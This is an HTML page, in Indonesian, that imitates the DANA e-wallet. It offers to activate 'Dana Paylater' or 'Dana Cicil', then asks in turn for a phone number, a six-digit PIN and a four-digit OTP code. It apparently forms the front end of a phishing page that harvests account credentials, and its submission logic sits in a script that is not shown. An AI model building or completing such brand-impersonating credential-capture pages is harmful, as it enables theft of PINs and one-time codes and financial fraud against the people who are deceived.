<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DANA UI</title>

  <!-- HUBUNGKAN CSS -->
  <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

  <div class="logo">DANA</div>

  <!-- Screen 1 -->
  <div class="screen active" id="screen1">
    <div class="box">
      <label><input type="radio" checked> Aktifkan Dana Paylater</label>
      <label><input type="radio"> Aktifkan Dana Cicil</label>
      <label><input type="radio"> Laporkan Kendala</label>
    </div>
    <button class="btn" onclick="next(2)">Konfirmasi</button>
  </div>

  <!-- Screen 2 -->
  <div class="screen" id="screen2">
    <input id="phone" class="input" placeholder="+62 811-xxxx-xxxx">
    <button id="btnPhone" class="btn" disabled>Lanjut</button>
  </div>

  <!-- Screen 3 -->
  <div class="screen" id="screen3">
    <div class="pin-box" id="pinInputs">
      <input maxlength="1"><input maxlength="1"><input maxlength="1">
      <input maxlength="1"><input maxlength="1"><input maxlength="1">
    </div>
    <button id="btnPin" class="btn" disabled>Verifikasi</button>
  </div>

</div>

<!-- Overlay OTP -->
<div class="overlay" id="otpOverlay">
  <h3>Verifikasi OTP</h3>
  <div class="loader" id="loader"></div>

  <div class="pin-box" id="otpInputs" style="display:none;">
    <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
  </div>

  <div class="small" id="timer">Kirim ulang (60s)</div>
</div>

<!-- HUBUNGKAN JS -->
<script src="script.js"></script>

</body>
</html>
